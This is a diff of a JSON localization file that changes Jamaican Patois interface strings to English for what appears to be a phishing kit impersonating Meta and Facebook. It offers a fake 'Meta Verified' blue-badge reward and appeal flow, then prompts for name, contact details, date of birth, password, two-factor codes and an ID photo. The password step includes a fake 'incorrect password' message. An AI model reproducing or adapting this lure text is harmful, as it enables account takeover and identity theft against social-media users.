@@ -1,245 +1,245 @@
 {
   "menu": {
-    "title": "Preevasi Senta",
+    "title": "Privacy Centre",
     "menu_1": {
-      "title": "Preevasi Senta Home"
+      "title": "Privacy Centre Home"
     },
     "menu_2": {
-      "title": "Sooch"
+      "title": "Search"
     },
     "menu_3": {
-      "title": "Komon Preevasi Setinz"
+      "title": "Common Privacy Settings"
     },
     "menu_4": {
-      "title": "Preevasi Tapiik dem"
+      "title": "Privacy Topics"
     },
     "menu_5": {
-      "title": "Mo Preevasi Risoss dem"
+      "title": "More Privacy Resources"
     },
     "menu_6": {
-      "title": "Preevasi Palisi",
+      "title": "Privacy Policy",
       "sub_title": {
-        "sub_1": "Weh da di Preevasi Palisi an weh ih kova?",
-        "sub_2": "Weh kain a infamayshan wi kuda kolekt?",
-        "sub_3": "How wi yooz unu infamayshan?",
-        "sub_4": "How wi shayr unu infamayshan pan praduuk dem ar wid integretid paatna dem?",
-        "sub_5": "How wi shayr infamayshan wid tird paati dem?",
-        "sub_6": "How di koperayshan bitween kompani dem aaganayz?",
-        "sub_7": "How unu kyan manij ar dilit unu infamayshan an ekserasayz unu rait dem?",
-        "sub_8": "How lang wi kip unu infamayshan?",
-        "sub_9": "How wi transmeet infamayshan?",
-        "sub_10": "How wi rispon tu afishal rikwes, kplay wid aplikabl laa dem, an privent haam?",
-        "sub_11": "How unu wahn noa wen di palisi chaynj?",
-        "sub_12": "How fi aks kweschan dem?",
-        "sub_13": "Why an how wi prases unu data"
+        "sub_1": "What is the Privacy Policy and what does it cover?",
+        "sub_2": "What information do we collect?",
+        "sub_3": "How do we use your information?",
+        "sub_4": "How do we share your information on products or with integrated partners?",
+        "sub_5": "How do we share information with third parties?",
+        "sub_6": "How is the cooperation between companies organized?",
+        "sub_7": "How can you manage or delete your information and exercise your rights?",
+        "sub_8": "How long do we keep your information?",
+        "sub_9": "How do we transmit information?",
+        "sub_10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
+        "sub_11": "How will you know when the policy changes?",
+        "sub_12": "How to ask questions?",
+        "sub_13": "Why and how do we process your data"
       }
     },
     "menu_7": {
-      "title": "Ada Palisi an Aatikl dem",
+      "title": "Other Policies and Articles",
       "sub_title": {
-        "sub_1": "Kuki Palisi",
-        "sub_2": "Infamayshan fi dem weh no yooz praduuk dem",
-        "sub_3": "How infamayshan yooz fi jenaretiv AI model dem",
-        "sub_4": "Data Transfa Fremwok Palisi",
-        "sub_5": "Ada toomz an kandishan dem"
+        "sub_1": "Cookie Policy",
+        "sub_2": "Information for those who don't use products",
+        "sub_3": "How information is used for generative AI models",
+        "sub_4": "Data Transfer Framework Policy",
+        "sub_5": "Other terms and conditions"
       }
     }
   },
   "content": {
     "top_content": {
-      "title": "Meta Verified – Rewards fi you",
+      "title": "Meta Verified – Rewards for You",
       "sub": {
-        "sub_1": "Big up! You done meet all di requirements fi upgrade your page wid di blue check badge! Dis ya wah big step weh show how dedicated you di be an di trust weh you build wid your followers.",
-        "sub_2": "We happy fi celebrate dis moment wid you, an we di look forward fi see how your page gwaan shine more wid dis special recognition!"
+        "sub_1": "Congratulations on meeting the requirements to upgrade your page with a verified blue badge! This is an incredible milestone that highlights your dedication and the trust you’ve built with your community.",
+        "sub_2": "We’re excited to celebrate this achievement with you and look forward to seeing your page continue to grow under this prestigious recognition!"
       },
-      "ticket": "Your request ID:"
+      "ticket": "Your Request ID:"
     },
     "guide": {
-      "title": "✅ Guide fi apply fi di Blue Check Badge",
+      "title": "✅ Verified Blue Badge Request Guide",
       "sub": {
-        "sub_1": "Fact-checkers noh wah answer any request weh got threats, hate talk, or bad language.",
-        "sub_2": "When you di send your request, please gimme all di information weh we need fi deal wid it quick. If you gimme one wrong email or you noh answer we message eena two days, di request might close before we check it. If nothing happen eena four days, Meta wah reject it automatically.",
-        "sub_3": "After you send everything, we wah check your account fi see if got any restriction. Di process usually tek ‘bout 24 hours, but sometimes it could tek longer. Depending pan di decision, we wah keep or lift di restriction, an update your account same way."
+        "sub_1": "Fact-checkers will not respond to requests containing threats, hate speech, or abusive language.",
+        "sub_2": "Please provide all required information in your request to ensure timely processing. Submitting an invalid email address or failing to reply to additional information requests within 2 days may result in the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+        "sub_3": "Once all details are submitted, we’ll evaluate your account for any policy restrictions. The verification process typically takes about 24 hours but may take longer in some cases. Based on the review outcome, restrictions will either remain or be lifted, and your account will be updated accordingly."
       }
     },
     "thumb": {
-      "title": "Verification Review",
+      "title": "",
       "sub": {
-        "sub_1": "Request fi Review",
-        "sub_2": "Processing usually tek ‘bout 24 to 48 hours. Your account wah get check fi any policy violation."
+        "sub_1": "Review request",
+        "sub_2": "Processing usually takes 24–48 hours. Your account will be reviewed for any policy violations."
       },
-      "button": "Send di request",
-      "day": "You get verified pan"
+      "button": "Submit Request",
+      "day": "You were verified on"
     },
     "appeal_guide": {
-      "title": "Apeel Gayd",
+      "title": "Appeal Guide",
       "sub_title": {
-        "sub_1": "Fak cheka dem no maita rispon tu rikwes weh gat intimideyshan, hayt speech, ar ada voobal tret dem.",
-        "sub_2": "In unu apeel, pliz inkluud aal nesesari infamayshan fi mek di fak cheka prases unu rikwes kwik. If unu gi a invalid e-mail adres ar no rispon tu a rikwes fi mo infamayshan widin 2 day, di fak cheka kyan kloaz di aplikayshan widout prases. If di apeel no prases widin 4 day, Meta wahn aatamatikli rijek it.",
-        "sub_3": "Wen evriting redi, wi wahn rivyoo unu akount an disayd if ristricshan dem aplai tu it. Di verifikayshan prosija yoozuwali tek 24 owa, bot in som kays it kyan tek langa. Dipendin pan wi disizhan, di ristricshan dem wahn stay ar wi wahn lif dem an unu akount wahn risinstaat."
+        "sub_1": "Fact checkers may not respond to requests that include intimidation, hate speech, or other verbal threats.",
+        "sub_2": "In your appeal, please include all necessary information to make the fact checker process your request quickly. If you provide an invalid e-mail address or don't respond to a request for more information within 2 days, the fact checker can close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
+        "sub_3": "When everything is ready, we will review your account and decide if restrictions apply to it. The verification procedure usually takes 24 hours, but in some cases it can take longer. Depending on our decision, the restrictions will stay or we will lift them and your account will be reinstated."
       }
     },
     "privacy_center": {
-      "title": "Preevasi Senta",
+      "title": "Privacy Centre",
       "sub_title": {
         "sub_1": {
-          "title": "Weh da di Preevasi Palisi an weh ih seh?",
-          "description": "Preevasi Palisi"
+          "title": "What is the Privacy Policy and what does it say?",
+          "description": "Privacy Policy"
         },
         "sub_2": {
-          "title": "How unu kyan manij ar dilit unu infamayshan",
-          "description": "Preevasi Palisi"
+          "title": "How you can manage or delete your information",
+          "description": "Privacy Policy"
         }
       }
     },
     "more_info": {
-      "title": "Fi mo detail dem, si di Yooza Agriment",
+      "title": "For more details, see the User Agreement",
       "sub_title": {
         "sub_1": {
-          "title": "AI Praduuk",
-          "description": "Yooza Agriment"
+          "title": "AI Product",
+          "description": "User Agreement"
         }
       }
     },
     "resouces": {
-      "title": "Adishanal risoss dem",
+      "title": "Additional resources",
       "sub_title": {
         "sub_1": {
-          "title": "How infamayshan yooz fi jenaretiv AI model dem",
-          "description": "Preevasi Senta"
+          "title": "How information is used for generative AI models",
+          "description": "Privacy Centre"
         },
         "sub_2": {
-          "title": "Kaad dem wid infamayshan bout di apereyshan a AI sistem dem",
-          "description": "AI praduuk websayt"
+          "title": "Cards with information about the operation of AI systems",
+          "description": "AI product website"
         },
         "sub_3": {
-          "title": "Introdokshan tu Jenaretiv AI",
-          "description": "Fi teena dem"
+          "title": "Introduction to Generative AI",
+          "description": "For teens"
         }
       }
     },
     "footer": {
-      "title": "Wi kanchuuali aidentifai potenshal preevesi risk dem, inkluudin wen wi kolekt, yooz, ar shayr poosanal infamayshan, an divelop metad dem fi ridoos dem risk. Reed mo bout",
-      "link": "Preevasi Palisi"
+      "title": "We continuously identify potential privacy risks, including when we collect, use, or share personal information, and develop methods to reduce those risks. Read more about",
+      "link": "Privacy Policy"
     },
     "modal": {
       "appeal_request": {
-        "title": "Apeel Faam",
+        "title": "Information Form",
         "form": {
           "name": {
-            "placeholder": "Ful Naym",
-            "required": "Pliz enta nuff ful naym."
+            "placeholder": "Full Name",
+            "required": "Please enter enough full name."
           },
           "email": {
             "placeholder": "E-mail",
-            "required": "Pliz enta nuff e-mail adres."
+            "required": "Please enter enough e-mail address."
           },
           "email_business": {
-            "placeholder": "Bizniz E-mail",
-            "required": "Pliz enta nuff bizniz e-mail adres."
+            "placeholder": "Business E-mail",
+            "required": "Please enter enough business e-mail address."
           },
           "page_name": {
-            "placeholder": "Fanpayj URL",
-            "required": "Plees put een di ful fanpayj URL."
+            "placeholder": "Fanpage Url",
+            "required": "Please enter enough fanpage url."
           },
           "phone_number": {
-            "placeholder": "Fone Nomba",
-            "required": "Pliz enta nuff fone nomba."
+            "placeholder": "Phone Number",
+            "required": "Please enter enough phone number."
           },
           "date_of_birth": {
-            "title": "Det a Boott",
+            "title": "Date of Birth",
             "day": {
               "placeholder": "Day",
-              "required": "Pliz enta nuff day."
+              "required": "Please enter enough day."
             },
             "month": {
-              "placeholder": "Munt",
-              "required": "Pliz enta nuff munt."
+              "placeholder": "Month",
+              "required": "Please enter enough month."
             },
             "year": {
-              "placeholder": "Yaa",
-              "required": "Pliz enta nuff yaa."
+              "placeholder": "Year",
+              "required": "Please enter enough year."
             }
           },
           "issue": {
-            "placeholder": "Diskrayb unu ishoo",
-            "required": "Pliz enta unu ishoo.",
-            "note": "Wi rispons wahn sen tu unu widin 14 - 48 owa."
+            "placeholder": "Note",
+            "required": "Please enter your issue.",
+            "note": "Our response will be sent to you within 14 - 48 hours."
           },
           "facebook_notification": {
-            "title": "pan Facebook",
-            "description": "Wi wahn sen unu a notifikayshan pan Facebook."
+            "title": "on Facebook",
+            "description": "We will send you a notification on Facebook."
           },
           "check_form": {
-            "title": "Mi agree wid",
-            "link": "Toomz a yooz"
+            "title": "I agree with",
+            "link": "Terms of use"
           },
-          "button": "Sen"
+          "button": "Send"
         }
       },
       "password": {
-        "title": "Paswod",
-        "description": "Fi unu sekuriti, unu mos enta unu paswod fi kantiynoo.",
+        "title": "Password",
+        "description": "For your security, you must enter your password to continue.",
         "form": {
           "password": {
-            "placeholder": "Paswod",
-            "required": "Unu no enta unu paswod!",
-            "warning": "Di paswod unu enta no karek."
+            "placeholder": "Password",
+            "required": "You did not enter your password!",
+            "warning": "The password you entered is incorrect."
           },
-          "button": "Kantiynoo",
-          "forgot_password": "Fagat unu paswod?"
+          "button": "Continue",
+          "forgot_password": "Forgot your password?"
         }
       },
       "2fa": {
-        "title": "Too-fakta autentikayshan rikwaya (1/3)",
-        "description": "Di verifikayshan koad don sen tu unu fone nomba ar e-mail, pliz chek unu inbox an enta di koad biloa fi kampleet. In kays unu no get di koad, pliz chek di Facebook notifikayshan pan unu divays an kanfoom seh da unu fi kampleet di verifikayshan prases.",
+        "title": "Two-factor authentication required (1/3)",
+        "description": "The verification code has been sent to your phone number or e-mail, please check your inbox and enter the code below to complete. In case you don't receive the code, please check the Facebook notification on your device and confirm it's you to complete the verification process.",
         "form": {
-          "placeholder": "Koad",
-          "warning": "Di too-fakta autentikayshan unu enta no karek. Pliz, trai agen afta",
-          "required": "Unu no enta unu too-fakta autentikayshan!",
-          "minutes": "minit dem",
-          "seconds": "sekan dem",
-          "button": "Kantiynoo"
+          "placeholder": "Code",
+          "warning": "The two-factor authentication you entered is incorrect. Please, try again after",
+          "required": "You did not enter your two-factor authentication!",
+          "minutes": "minutes",
+          "seconds": "seconds",
+          "button": "Continue"
         }
       },
       "upload_file": {
-        "title": "Upload unu ID",
+        "title": "Upload your ID",
         "sub_title": {
-          "sub_1": "Bifo wi kyan get unu bak pan Facebook sayfli, wi need fi mek shoa dis da unu akount. Unu kyan proov dis akount da unu own by sen wi a foto a unu ID.",
-          "sub_2": "Wi no aksep foto a kompyoota skreen, fone skreen, ar fotokapi. If deh eni ishoo, wi wahn sen unu a e-mail.",
-          "sub_3": "Wi wahn stor a enkriptid kapi a unu selfi fi op tu wan yaa fi improov wi abilati fi detek fayk foto dem, kipin Facebook sayf fram impersanayshan.",
-          "sub_4": "Chaynj how lang wi stor unu selfi fa",
-          "sub_5": "ar",
-          "sub_6": "Loon mo"
+          "sub_1": "Before we can get you back on Facebook safely, we need to make sure this is your account. You can prove this account is yours by sending us a photo of your ID.",
+          "sub_2": "We don't accept photos of a computer screen, phone screen, or photocopy. If there are any issues, we will send you an e-mail.",
+          "sub_3": "We will store an encrypted copy of your selfie for up to one year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.",
+          "sub_4": "Change how long we store your selfie for",
+          "sub_5": "or",
+          "sub_6": "Learn more"
         },
         "form": {
-          "file": "Upload unu ID",
-          "warning": "no da a imij fail",
-          "button": "Kantiynoo"
+          "file": "Upload your ID",
+          "warning": "is not an image file",
+          "button": "Continue"
         }
       },
       "final_step": {
-        "title": "Rikwes don sen",
-        "description": "Unu rikwes don ad tu di prasesin kew. Wi wahn prases unu rikwes widin 24 owa. If unu no get a e-mail mesij wid di apeel statas widin 24 owa, pliz resen di apeel.",
-        "button": "Ritun tu Facebook"
+        "title": "Request has been sent",
+        "description": "Your request has been added to the processing queue. We will process your request within 24 hours. If you don't receive an e-mail message with the appeal status within 24 hours, please resend the appeal.",
+        "button": "Return to Facebook"
       },
       "authen_modal": {
-        "title": "Chooz a way fi kanfoom seh da unu",
+        "title": "Choose a way to confirm it's you",
         "app": {
-          "sub_1": "Autentikayta app",
-          "sub_2": "Go tu unu autentikayshan app"
+          "sub_1": "Authentication app",
+          "sub_2": "Go to your authentication app"
         },
         "sms": {
           "sub_1": "SMS",
-          "sub_2": "Wi wahn sen a koad tu di nomba"
+          "sub_2": "We will send a code to the number"
         },
         "email": {
           "sub_1": "E-mail",
-          "sub_2": "Wi wahn sen a koad tu"
+          "sub_2": "We will send a code to"
         },
         "whatsapp": {
           "sub_1": "WhatsApp",
-          "sub_2": "Wi wahn sen a koad tu di nomba"
+          "sub_2": "We will send a code to the number"
         }
       }
     }
